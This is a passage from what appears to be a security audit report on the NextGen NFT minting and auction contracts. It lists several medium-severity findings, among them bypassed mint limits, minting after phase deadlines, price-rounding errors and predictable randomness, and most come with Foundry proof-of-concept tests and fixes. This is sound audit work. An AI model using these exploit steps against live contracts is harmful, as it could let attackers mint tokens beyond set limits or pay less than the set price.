            blockTS + 5 days // auction end time
        );
        vm.prank(trustedAccount);
        IERC721(address(hhCore)).approve(address(hhAuctionDemo), 10000000001);

        vm.prank(bidder);
        hhAuctionDemo.participateToAuction{value: 20 ether}(10000000001);

        assertEq(hhAuctionDemo.returnHighestBid(10000000001), 20 ether);
        assertEq(hhAuctionDemo.returnHighestBidder(10000000001), bidder);

        vm.warp(blockTS + 6 days);
        vm.startPrank(bidder);
        hhAuctionDemo.claimAuction(10000000000);
        hhAuctionDemo.claimAuction(10000000001);
        vm.stopPrank();

        // @audit-issue : bidder now has 2 tokens, in spite of maxAllowance being 1.
        assertEq(IERC721(address(hhCore)).ownerOf(10000000000), bidder);
        assertEq(IERC721(address(hhCore)).ownerOf(10000000001), bidder);
    }
}
```

There are two ways to look at the above results:
1. That the `bidder` could procure 2 tokens, OR
2. That even prior to that, the `trustedAccount` could mint 2 tokens.

`maxAllowance` constraint should have kicked in, but did not.

## Tools Used
Foundry.

## Recommended Mitigation Steps
Add the necessary `if` condition inside `mintAndAuction`, `claimAuction()` or `returnHighestBid()` which checks against maxAllowance.

---

### <a id="m-06"></a>[M-06]
## **`mintAndAuction()` allows to mint tokens even after `allowlistEndTime` and `publicEndTime`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L276-L298
<br>

## Impact
Even after the end time of phases is set via [setCollectionPhases()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L170), it's possible to mint tokens past these deadlines through [mintAndAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L276-L298). 

## Proof of Concept
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cMintAfterEndTime.t.sol`.
- Run via `forge test --mt test_t0x1cMintAfterEndTime -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

contract t0x1cMintAfterEndTime is Test {
    address public trustedAccount;
    bytes32 public merkleRoot_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;
    auctionDemo hhAuctionDemo;

    function setUp() public {
        trustedAccount = makeAddr("trustedAccount");
        merkleRoot_msgSender = 0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3; // gives max allowance of 19 tokens in phase1

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));
        hhAuctionDemo = new auctionDemo(address(hhMinter), address(hhCore), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(trustedAccount, 100 ether);
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
        assertNotEq(address(hhAuctionDemo), address(0));
    }

    function test_t0x1cMintAfterEndTime() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, trustedAccount, true);

        /// set collection data
        vm.prank(trustedAccount);
        hhCore.setCollectionData(
            1, // collectionID
            trustedAccount, // collectionArtistAddress
            1, // maxCollectionPurchases 
            100, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            0, // collectionMintCost
            0, // collectionEndMintCost
            0, // rate
            2 days, // timePeriod  
            0, // salesOption (airdrop for mintAndAuction())
            address(0)
        );

        uint256 blockTS = block.timestamp;

        hhMinter.setCollectionPhases(
            1, // collectionID
            blockTS + 2 days, // _allowlistStartTime
            blockTS + 3 days, // _allowlistEndTime
            blockTS + 8 days, // _publicStartTime
            blockTS + 9 days, // _publicEndTime
            merkleRoot_msgSender
        );

        // should work, as expected
        vm.warp(blockTS + 2 days);
        hhMinter.mintAndAuction(
            trustedAccount,
            '{"tdh": "100"}',
            99,
            1,
            blockTS + 3 days // auction end time
        );
        assertEq(IERC721(address(hhCore)).ownerOf(10000000000), trustedAccount);

        // bug: should not have worked!
        vm.warp(blockTS + 4 days);
        hhMinter.mintAndAuction(
            trustedAccount,
            '{"tdh": "100"}',
            99,
            1,
            blockTS + 5 days // auction end time
        );
        assertEq(IERC721(address(hhCore)).ownerOf(10000000001), trustedAccount); // @audit-info : token id 10000000001 was minted even after end of _allowlistEndTime

        // bug: once again, should not have worked!!
        vm.warp(blockTS + 10 days);
        hhMinter.mintAndAuction(
            trustedAccount,
            '{"tdh": "100"}',
            99,
            1,
            blockTS + 11 days // auction end time
        );
        assertEq(IERC721(address(hhCore)).ownerOf(10000000002), trustedAccount); // @audit-info : token id 10000000002 was minted even after end of _publicEndTime
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
Enforce the check inside `mintAndAuction()` which verifies if `block.timestamp` is within the specified end time.

---

### <a id="m-07"></a>[M-07]
## **Division before multiplication causes possible loss of precision in `getPrice()` for `salesOption = 3`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L536
<br>

## Impact
Rounding-down due to `division operation before multiplication` happens inside [getPrice()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L536):
```js
collectionPhases[_collectionId].collectionMintCost + ((collectionPhases[_collectionId].collectionMintCost / collectionPhases[_collectionId].rate) * gencore.viewCirSupply(_collectionId))
```
This potentially causes loss of funds for the protocol as [mint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L196), [burnToMint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L258) and [burnOrSwapExternalToMint()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L326) can be called with a `msg.value` lower than what should have been charged.

## Proof of Concept
As an example, suppose following values:
```js
collectionPhases[_collectionId].collectionMintCost = 9;
collectionPhases[_collectionId].rate = 10
gencore.viewCirSupply(_collectionId) = 10
```

- Current (Incorrect style) calculation:
returnedPice = 9 + ((9 / 10) * 10) = `9`

- Correct calculation:
returnedPice = 9 + ((9 * 10) / 10) = `18`

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Make the following change:

```diff
File: smart-contracts/MinterContract.sol#L536

-   return collectionPhases[_collectionId].collectionMintCost + ((collectionPhases[_collectionId].collectionMintCost / collectionPhases[_collectionId].rate) * gencore.viewCirSupply(_collectionId));
+   return collectionPhases[_collectionId].collectionMintCost + ((collectionPhases[_collectionId].collectionMintCost * gencore.viewCirSupply(_collectionId)) / collectionPhases[_collectionId].rate);
```

---

### <a id="m-08"></a>[M-08]
## **Incorrect returned value from `getPrice()` for `salesOption = 2` if `block.timestamp = publicEndTime`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L540
<br>

## Impact
For minting a token with `salesOption` 2, instead of paying the `collectionEndMintCost` the user is asked to pay the much higher & incorrect `collectionMintCost` value if he tries to mint at timestamp equalling `publicEndTime`. This is because of an incorrect condition check done [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L540). Less-than-equal-to operator `<=` should be used instead of `<` while checking the condition `&& block.timestamp < collectionPhases[_collectionId].publicEndTime`.

## Proof of Concept
The following PoC shows how `getPrice()` returns a value of `12 ether` instead of the correct expected value of `2 ether`.

- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cSalesOption2.t.sol`.
- Run via `forge test --mt test_t0x1cSalesOption2 -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

contract t0x1cSalesOption2 is Test {
    address public addr1;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    function setUp() public {
        addr1 = makeAddr("addr1");
        merkleRoot_msgSender =
            0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer =
        new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter =
        new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));
        // vm.stopPrank();

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cSalesOption2() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            2, // maxCollectionPurchases
            2, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            12 ether, // collectionMintCost
            2 ether, // collectionEndMintCost
            1 ether, // rate
            1 days, // timePeriod
            2, // salesOption
            address(0)
        );

        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp + 1 days, // _allowlistStartTime
            block.timestamp + 2 days, // _allowlistEndTime
            block.timestamp + 3 days, // _publicStartTime
            block.timestamp + 11 days, // _publicEndTime
            merkleRoot_msgSender
        );

        // jump to `_publicEndTime`
        vm.warp(block.timestamp + 11 days);
        // @audit-issue : calculated price is 12 ether instead of the expected 2 ether
        assertEq(hhMinter.getPrice(1), 12 ether);
    }
}
```

## Tools Used
Manual inspection, Foundry.

## Recommended Mitigation Steps
Make the following change:

```diff
File: smart-contracts/MinterContract.sol#L540

-   } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp > collectionPhases[_collectionId].allowlistStartTime && block.timestamp < collectionPhases[_collectionId].publicEndTime){
+   } else if (collectionPhases[_collectionId].salesOption == 2 && block.timestamp > collectionPhases[_collectionId].allowlistStartTime && block.timestamp <= collectionPhases[_collectionId].publicEndTime){
```

---

### <a id="m-09"></a>[M-09]
## **All the parameters chosen are bad sources of randomness and are deterministic**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/RandomizerNXT.sol#L55-L59
<br>

## Impact
All the parameters chosen to generate a random token hash in [calculateTokenHash()](https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/RandomizerNXT.sol#L57) are predictable and a bad source for randomness.

## Proof of Concept
`_mintIndex`, `blockhash`, `randomNumber()`, `randomWord()` can all be predicted by a miner in advance and hence is not truly random.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Depend on VRF randomizer instead of `RandomizerNXT.sol`.

---

### <a id="m-10"></a>[M-09]
## **`airDropTokens()` fails for all if any of the recipients does not implement `onERC721Received`**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L181-L192
<br>

## Impact
[airDropTokens()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L181-L192) implements a [loop](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L189) to air drop tokens to its recipients. However, if any of those recipients is a smart contract not implementing `onERC721Received`, the whole transaction reverts and none of the recipients receive their tokens.

## Proof of Concept
There is no exception handling implemented, so the call reverts even if the very last recipient is a "bad" receiver with no `onERC721Received`. The error thrown is `ERC721: transfer to non ERC721Receiver implementer`.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Implement a try block, something like this:

```diff
    function airDropTokens(address[] memory _recipients, string[] memory _tokenData, uint256[] memory _saltfun_o, uint256 _collectionID, uint256[] memory _numberOfTokens) public FunctionAdminRequired(this.airDropTokens.selector) {
        require(gencore.retrievewereDataAdded(_collectionID) == true, "Add data");
        uint256 collectionTokenMintIndex;
        for (uint256 y=0; y< _recipients.length; y++) {
            collectionTokenMintIndex = gencore.viewTokensIndexMin(_collectionID) + gencore.viewCirSupply(_collectionID) + _numberOfTokens[y] - 1;
            require(collectionTokenMintIndex <= gencore.viewTokensIndexMax(_collectionID), "No supply");
            for(uint256 i = 0; i < _numberOfTokens[y]; i++) {
                uint256 mintIndex = gencore.viewTokensIndexMin(_collectionID) + gencore.viewCirSupply(_collectionID);
-               gencore.airDropTokens(mintIndex, _recipients[y], _tokenData[y], _saltfun_o[y], _collectionID);
+               try gencore.airDropTokens(mintIndex, _recipients[y], _tokenData[y], _saltfun_o[y], _collectionID) {
+               } catch {
+                   // maybe store this address in a mapping if we want to retry later
+               }
            }
        }
    }
```
